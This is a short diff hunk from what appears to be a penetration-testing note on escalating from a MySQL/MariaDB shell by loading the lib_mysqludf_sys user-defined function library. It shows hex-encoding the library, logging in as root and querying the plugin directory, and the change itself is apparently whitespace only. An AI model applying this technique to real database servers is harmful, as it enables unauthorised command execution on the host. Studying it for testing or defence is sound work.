@@ -10,7 +10,7 @@ If we can not access bash(or similar) shell but we can access mysql shell, you c
 $ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex 
 $ mysql --host=127.0.0.1 --port=3306 -u root -p
 
-MariaDB [(none)]> select @@plugin_dir; #show variables like '%plugin%';
+MariaDB [(none)]> select @@plugin_dir; #show variables like '%plugin%';
 +-------------------+
 | @@plugin_dir      |
 +-------------------+
